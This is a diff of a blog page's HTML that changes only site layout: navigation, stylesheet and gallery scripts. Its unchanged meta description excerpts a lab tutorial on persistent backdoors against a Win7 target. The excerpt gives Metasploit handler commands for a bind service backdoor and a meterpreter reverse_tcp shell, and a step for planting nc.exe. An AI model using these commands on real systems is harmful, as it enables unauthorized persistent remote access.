@@ -6,7 +6,7 @@
 
 <link rel='canonical' href='https://www.retr0.xyz/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/'>
 
-<link rel="stylesheet" href="/scss/style.min.e99117adbedc53a15fd675f2864a3c19bf22e672c1f2d56a2e49b699b01a3bfc.css"><meta property='og:title' content="1.12 进阶后门操作">
+<link rel="stylesheet" href="/scss/style.min.cabc62472403e563f3b7bbbddd12da7a73f0e716a790179bac9b9632786efa60.css"><meta property='og:title' content="1.12 进阶后门操作">
 <meta property='og:description' content=" 本篇内容使用win7-sp1靶机，请在资源库中自行下载导入\n进阶后门操作 复习 进入kali后若想要连接此前已经设置好的后门：\n通过服务启动 1 2 3 4 5 use exploit/multi/handler setpayload windows/metsvc_bind_tcp set lport 31337 set rhost [目标ip] run 永久性后门 1 2 3 4 5 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp set lport 4321 set lhost [自己ip] run 植入备用后门 上传文件 我们从【win10攻击机】中取nc.exe复制到kali中的kali文件夹，\n">
 <meta property='og:url' content='https://www.retr0.xyz/p/1.12-%E8%BF%9B%E9%98%B6%E5%90%8E%E9%97%A8%E6%93%8D%E4%BD%9C/'>
 <meta property='og:site_name' content='Retr0的小窝'>
@@ -221,6 +221,27 @@
 
                 
                 <span>归档 | Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/categories/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                
+                <span>分类 | Categories</span>
             </a>
         </li>
         
@@ -1472,8 +1493,10 @@ html[data-scheme="dark"] {
         
             
         
-        发表了151篇文章 · 
-        总计250.51k字
+            
+        
+        发表了152篇文章 · 
+        总计251.75k字
     </section>
 
     
@@ -1587,6 +1610,9 @@ html[data-scheme="dark"] {
         document.head.appendChild(customFont);
     }());
 </script>
+<link rel="stylesheet" href="/css/travel-gallery.css">
+
+<script src="/js/travel-gallery.js" defer></script>
 <link rel="stylesheet" href="/css/custom.css">
 <script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script>
 
@@ -1790,7 +1816,7 @@ function initPhotoSwipeFromDOM(selector) {
     if (!containers.length) return;
 
     containers.forEach(container => {
-        const images = container.querySelectorAll('img');
+        const images = Array.from(container.querySelectorAll('img')).filter(img => !img.closest('.trip-gallery'));
 
         images.forEach((img, index) => {
 
